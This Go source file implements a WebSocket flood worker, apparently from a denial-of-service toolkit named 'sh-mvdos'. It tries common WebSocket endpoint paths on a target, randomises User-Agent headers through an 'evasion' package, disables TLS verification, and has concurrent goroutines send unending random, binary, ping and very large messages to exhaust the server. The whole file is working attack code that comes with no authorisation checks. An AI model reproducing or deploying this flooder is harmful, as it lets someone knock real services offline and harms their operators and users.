package worker

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kjsst/sh-mvdos/internal/worker/evasion"
	"github.com/kjsst/sh-mvdos/internal/worker/payload"
)

type WSFlood struct {
	Target  string
	Workers int
}

func (w *WSFlood) Run(ctx context.Context) (uint64, uint64, error) {
	if w.Workers <= 0 {
		w.Workers = 4
	}
	candidates := wsCandidateURLs(w.Target)
	var reqs, errs atomic.Uint64
	done := make(chan struct{}, w.Workers)
	for i := 0; i < w.Workers; i++ {
		go func(workerID int) {
			defer func() { done <- struct{}{} }()
			idx := workerID % len(candidates)
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				n, err := wsFloodSession(ctx, candidates[idx])
				idx = (idx + 1) % len(candidates)
				reqs.Add(n)
				if err != nil {
					errs.Add(1)
				}
			}
		}(i)
	}
	<-ctx.Done()
	for i := 0; i < w.Workers; i++ {
		<-done
	}
	return reqs.Load(), errs.Load(), ctx.Err()
}

func wsCandidateURLs(targetURL string) []string {
	u, err := url.Parse(targetURL)
	if err != nil {
		return []string{targetURL}
	}
	scheme := "ws"
	if u.Scheme == "https" || u.Scheme == "wss" {
		scheme = "wss"
	}
	host := u.Host
	if host == "" {
		return []string{targetURL}
	}
	base := fmt.Sprintf("%s://%s", scheme, host)
	paths := []string{u.Path, "/", "/ws", "/websocket", "/socket.io/", "/api/ws", "/v1/ws"}
	seen := make(map[string]struct{})
	var out []string
	for _, p := range paths {
		if p == "" {
			p = "/"
		}
		candidate := base + p
		if _, ok := seen[candidate]; ok {
			continue
		}
		seen[candidate] = struct{}{}
		out = append(out, candidate)
	}
	return out
}

func wsFloodSession(ctx context.Context, wsURL string) (uint64, error) {
	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
	}
	headers := http.Header{}
	headers.Set("User-Agent", evasion.RandUA())
	if u, err := url.Parse(wsURL); err == nil {
		origin := "http://" + u.Host
		if u.Scheme == "wss" {
			origin = "https://" + u.Host
		}
		headers.Set("Origin", origin)
	}

	conn, _, err := dialer.DialContext(ctx, wsURL, headers)
	if err != nil {
		return 0, err
	}
	defer conn.Close()

	readDone := make(chan struct{})
	go func() {
		defer close(readDone)
		for {
			if _, _, err := conn.ReadMessage(); err != nil {
				return
			}
		}
	}()

	var sent uint64
	for {
		select {
		case <-ctx.Done():
			_ = conn.WriteMessage(websocket.CloseMessage,
				websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			return sent, nil
		case <-readDone:
			return sent, fmt.Errorf("websocket closed")
		default:
		}

		var writeErr error
		switch rand.Intn(5) {
		case 0:
			msg := fmt.Sprintf(`{"action":"%s","data":"%s","ts":%d}`,
				payload.RandString(8), payload.RandString(200+rand.Intn(2000)), time.Now().UnixNano())
			writeErr = conn.WriteMessage(websocket.TextMessage, []byte(msg))
		case 1:
			data := make([]byte, 1024+rand.Intn(7168))
			rand.Read(data)
			writeErr = conn.WriteMessage(websocket.BinaryMessage, data)
		case 2:
			writeErr = conn.WriteMessage(websocket.PingMessage, []byte(payload.RandString(16)))
		case 3:
			writeErr = conn.WriteMessage(websocket.TextMessage, []byte(payload.RandString(10240+rand.Intn(40960))))
		case 4:
			for j := 0; j < 10; j++ {
				if e := conn.WriteMessage(websocket.TextMessage, []byte(payload.RandString(16))); e != nil {
					writeErr = e
					break
				}
				sent++
			}
		}
		if writeErr != nil {
			return sent, writeErr
		}
		sent++
	}
}